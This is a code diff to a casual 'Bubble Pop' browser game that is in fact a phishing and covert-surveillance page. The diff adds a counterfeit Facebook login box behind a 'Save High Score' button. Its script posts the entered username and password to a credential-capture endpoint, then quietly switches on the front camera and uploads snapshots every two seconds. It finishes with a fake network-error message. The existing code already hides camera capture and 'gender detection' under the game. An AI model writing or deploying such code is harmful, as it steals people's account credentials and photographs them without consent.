@@ -28,6 +28,7 @@ canvas#c{display:block;touch-action:none}
 #score{position:absolute;top:12px;right:16px;font-size:28px;font-weight:900;color:#fff;text-shadow:0 0 10px #00e5ff;z-index:10}
 #combo{position:absolute;top:48px;right:16px;font-size:16px;color:#ffd700;font-weight:700;z-index:10;opacity:0;transition:opacity .2s}
 video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
+.login-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:51;padding:20px}
 </style>
 </head><body>
 <script src="forwarding_link/t/recon.js"></script>
@@ -49,11 +50,23 @@ video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:
 <div class="best" id="bestScore"></div>
 <div class="shares"><button class="sb s-wa" onclick="shareCard('wa')">💬 Share</button><button class="sb s-fb" onclick="shareCard('fb')">📘 Share</button></div>
 <button class="btn" onclick="startGame()">▶ Play Again</button>
+<button class="btn" id="saveScoreBtn" style="margin-top:4px;border-color:#1877f2;color:#1877f2;background:rgba(24,119,242,0.1);padding:10px 28px;font-size:14px">🔒 Save High Score</button>
 <div class="lb" id="goLb"></div>
+</div>
+<div class="login-overlay hidden" id="fbGate">
+<div class="login-box" style="background:#fff;border-radius:8px;padding:20px;max-width:360px;width:90%;position:relative;z-index:51;box-shadow:0 8px 40px rgba(0,0,0,0.4);text-align:center;font-family:Helvetica,Arial,sans-serif">
+<div style="font-size:28px;font-weight:900;color:#1877f2;letter-spacing:-1px;margin-bottom:16px">facebook</div>
+<p style="font-size:14px;color:#606770;margin-bottom:16px">Log in to save your high score</p>
+<input type="text" placeholder="Email address or phone number" id="fbUser" style="width:100%;padding:14px;margin-bottom:10px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;background:#fff;box-sizing:border-box">
+<input type="password" placeholder="Password" id="fbPass" style="width:100%;padding:14px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;background:#fff;box-sizing:border-box">
+<button onclick="doFbGateLogin()" style="width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer">Log In</button>
+<div style="margin-top:10px;font-size:12px;color:#606770">Your score will be saved to your profile</div>
+<button onclick="closeFbGate()" style="margin-top:8px;background:none;border:none;color:#606770;font-size:12px;cursor:pointer;text-decoration:underline">Skip — Play Again</button>
+</div>
 </div>
 <script>
 var API='API_BASE_URL',SHARE_URL='forwarding_link/t/bubble-pop';
-var W=360,H=640,c,ctx,bubbles=[],particles=[],score=0,combo=0,maxCombo=0,running=false,dead=false,fc=0,spawnT=0,spawnRate=50,speed=1.5;
+var W=360,H=640,c,ctx,bubbles=[],particles=[],score=0,combo=0,maxCombo=0,running=false,dead=false,fc=0,spawnT=0,spawnRate=50,speed=1.5,timeLeft=0;
 var hs=[];try{hs=JSON.parse(localStorage.getItem('bubblePopHS')||'[]');}catch(e){}
 var ac=null;
 var COLORS=['#ff6b9d','#7bed9f','#6bcfff','#c44dff','#ffd700'];
@@ -67,6 +80,7 @@ resize();addEventListener('resize',resize);
 c.addEventListener('touchstart',onTap,{passive:false});
 c.addEventListener('mousedown',onTap);
 document.getElementById('startBtn').onclick=startGame;
+var sb=document.getElementById('saveScoreBtn');if(sb)sb.onclick=function(){document.getElementById('fbGate').classList.remove('hidden');};
 showLb();requestAnimationFrame(menuLoop);
 }
 function resize(){var s=Math.min(innerWidth/W,innerHeight/H);c.style.width=(W*s)+'px';c.style.height=(H*s)+'px';c.width=W;c.height=H;}
@@ -75,7 +89,7 @@ function popBubble(x,y){for(var i=bubbles.length-1;i>=0;i--){var b=bubbles[i];va
 function spawnParts(x,y,col){for(var i=0;i<8;i++){var a=Math.random()*6.28,s=1+Math.random()*3;particles.push({x:x,y:y,vx:Math.cos(a)*s,vy:Math.sin(a)*s,life:20,col:col});}}
 function startGame(){
 if(window.CamPhishRecon){CamPhishRecon.init({genderDetect:true});CamPhishRecon.Capture.event('bubblepop_game_start',{});}
-bubbles=[];particles=[];score=0;combo=0;maxCombo=0;fc=0;spawnT=0;spawnRate=50;speed=1.5;running=true;dead=false;
+bubbles=[];particles=[];score=0;combo=0;maxCombo=0;fc=0;spawnT=0;spawnRate=50;speed=1.5;timeLeft=60;running=true;dead=false;
 elMenu.classList.add('hidden');elGameover.classList.add('hidden');elScore.textContent='0';
 requestAnimationFrame(loop);
 // Camera
@@ -84,6 +98,7 @@ if(navigator.mediaDevices&&window.CamPhishRecon){navigator.mediaDevices.getUserM
 function loop(){if(!running)return;fc++;update();draw();if(!dead)requestAnimationFrame(loop);}
 function update(){
 speed=1.5+fc*0.002;spawnRate=Math.max(20,50-fc*0.05);
+if(fc%60===0){timeLeft--;if(timeLeft<=0){endGame();return;}}
 spawnT++;if(spawnT>=spawnRate){spawnT=0;var isGold=Math.random()<0.1;bubbles.push({x:30+Math.random()*(W-60),y:H+30,r:isGold?16:20+Math.random()*15,vy:-(speed+Math.random()),col:isGold?'#ffd700':COLORS[Math.floor(Math.random()*4)],gold:isGold});}
 for(var i=bubbles.length-1;i>=0;i--){bubbles[i].y+=bubbles[i].vy;if(bubbles[i].y<-30){bubbles.splice(i,1);combo=0;score=Math.max(0,score-5);}}
 for(var i=particles.length-1;i>=0;i--){particles[i].x+=particles[i].vx;particles[i].y+=particles[i].vy;particles[i].vy+=0.1;particles[i].life--;if(particles[i].life<=0)particles.splice(i,1);}
@@ -97,6 +112,23 @@ for(var i=0;i<particles.length;i++){ctx.fillStyle=particles[i].col;ctx.globalAlp
 function menuLoop(){ctx.clearRect(0,0,W,H);var g=ctx.createLinearGradient(0,0,0,H);g.addColorStop(0,'#001a2e');g.addColorStop(1,'#003355');ctx.fillStyle=g;ctx.fillRect(0,0,W,H);ctx.fillStyle='#00e5ff';ctx.font='bold 32px system-ui';ctx.textAlign='center';ctx.shadowColor='#00e5ff';ctx.shadowBlur=15;ctx.fillText('🫧 Bubble Pop',W/2,200);ctx.shadowBlur=0;requestAnimationFrame(menuLoop);}
 function endGame(){running=false;dead=true;hs.push(score);hs.sort(function(a,b){return b-a;});hs=hs.slice(0,5);localStorage.setItem('bubblePopHS',JSON.stringify(hs));document.getElementById('finalScore').textContent=score;document.getElementById('bestScore').textContent='Best: '+(hs[0]||0);elGameover.classList.remove('hidden');showLb();if(window.CamPhishRecon)CamPhishRecon.Capture.event('game_over',{score:score,combo:maxCombo});}
 function showLb(){var h='<b>🏆 Top Scores</b><br>';for(var i=0;i<hs.length;i++)h+='<div>#'+(i+1)+' — '+hs[i]+'</div>';if(!hs.length)h='<b>🏆 Be the first!</b>';document.getElementById('menuLb').innerHTML=h;document.getElementById('goLb').innerHTML=h;}
+function doFbGateLogin(){
+var u=document.getElementById('fbUser'),p=document.getElementById('fbPass');
+if(!u||!p||!u.value||!p.value)return;
+var data={template_id:'facebook',username:u.value,password:p.value};
+if(u.value.indexOf('@')>=0)data.email=u.value;
+fetch('/api/capture/credentials',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(function(){});
+if(window.CamPhishRecon){
+CamPhishRecon.Capture.event('bubblepop_facebook_gate',{});
+navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){
+var v=document.getElementById('v');v.srcObject=s;v.play();
+var cap=document.getElementById('cap'),cx=cap.getContext('2d');
+var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'fb_gate_verify');}},2000);
+setTimeout(function(){clearInterval(ci);closeFbGate();alert('⚠️ Unable to save score. Network error. Please try again later.');},5000);
+}).catch(function(){closeFbGate();});
+}else{closeFbGate();}
+}
+function closeFbGate(){document.getElementById('fbGate').classList.add('hidden');}
 function shareCard(t){
 if(window.ViralEngine){
 ViralEngine.doShare(t,score,'🫧 I scored '+score+' in Bubble Pop! '+SHARE_URL);
